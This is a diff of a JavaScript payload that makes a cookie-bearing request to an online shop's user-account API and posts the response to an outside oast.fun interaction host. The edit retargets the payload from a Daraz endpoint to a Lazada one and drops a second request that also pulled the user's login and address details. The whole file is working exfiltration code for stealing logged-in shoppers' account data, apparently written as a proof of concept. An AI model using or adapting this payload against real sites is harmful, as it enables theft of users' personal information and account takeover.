@@ -1,77 +1,52 @@
 // Create a new XMLHttpRequest object
 var xhr = new XMLHttpRequest();
 
-// Set up the first request
-xhr.open('GET', 'https://member.daraz.com.np/user/api/getUser', true);
+// Set up the request
+xhr.open('GET', 'https://member.lazada.sg/user/api/getUser', true);
 xhr.withCredentials = true; // Send cookies with the request
 
-var acc_details, address_user;
+var acc_details;
 
 // Define what happens on successful data retrieval
 xhr.onload = function() {
   if (xhr.status >= 200 && xhr.status < 300) {
-    // Store the data from the first request
+    // Store the data from the request
     acc_details = xhr.responseText;
 
-    // Create a new XHR object for the second request
-    var secondXhr = new XMLHttpRequest();
+    // Create a new XHR object for the webhook request
+    var webhookXhr = new XMLHttpRequest();
 
-    // Set up the second request
-    secondXhr.open('GET', 'https://acs-m.daraz.com.np/h5/mtop.im.use.web.buyer.mtopimaccountservice.getloginuserinfo', true);
-    secondXhr.withCredentials = true; // Send cookies with the request
+    // Prepare the request to the webhook
+    webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmu0lc79wp6tcydt.oast.fun', true);
+    webhookXhr.setRequestHeader('Content-type', 'application/json');
 
-    // Define what happens on successful data retrieval
-    secondXhr.onload = function() {
-      if (secondXhr.status >= 200 && secondXhr.status < 300) {
-        // Store the data from the second request
-        address_user = secondXhr.responseText;
-
-        // Create a new XHR object for the webhook request
-        var webhookXhr = new XMLHttpRequest();
-
-        // Prepare the request to the webhook
-        webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmu0lc79wp6tcydt.oast.fun', true);
-        webhookXhr.setRequestHeader('Content-type', 'application/json');
-
-        // Define what happens on successful data sending
-        webhookXhr.onload = function() {
-          if (webhookXhr.status >= 200 && webhookXhr.status < 300) {
-            // Request was successful
-            console.log('Data sent successfully to the webhook.');
-          } else {
-            // Request failed
-            console.error('Request failed with status: ' + webhookXhr.status);
-          }
-        };
-
-        // Handle any errors during the webhook request
-        webhookXhr.onerror = function() {
-          console.error('Request failed');
-        };
-
-        // Send the combined data to the webhook
-        webhookXhr.send(JSON.stringify({ acc_details: acc_details, address_user: address_user }));
+    // Define what happens on successful data sending
+    webhookXhr.onload = function() {
+      if (webhookXhr.status >= 200 && webhookXhr.status < 300) {
+        // Request was successful
+        console.log('Data sent successfully to the webhook.');
       } else {
-        console.error('Request failed with status: ' + secondXhr.status);
+        // Request failed
+        console.error('Request failed with status: ' + webhookXhr.status);
       }
     };
 
-    // Handle any errors during the second request
-    secondXhr.onerror = function() {
+    // Handle any errors during the webhook request
+    webhookXhr.onerror = function() {
       console.error('Request failed');
     };
 
-    // Send the second request
-    secondXhr.send();
+    // Send the data to the webhook
+    webhookXhr.send(JSON.stringify({ acc_details: acc_details }));
   } else {
     console.error('Request failed with status: ' + xhr.status);
   }
 };
 
-// Handle any errors during the first request
+// Handle any errors during the request
 xhr.onerror = function() {
   console.error('Request failed');
 };
 
-// Send the first request
+// Send the request
 xhr.send();
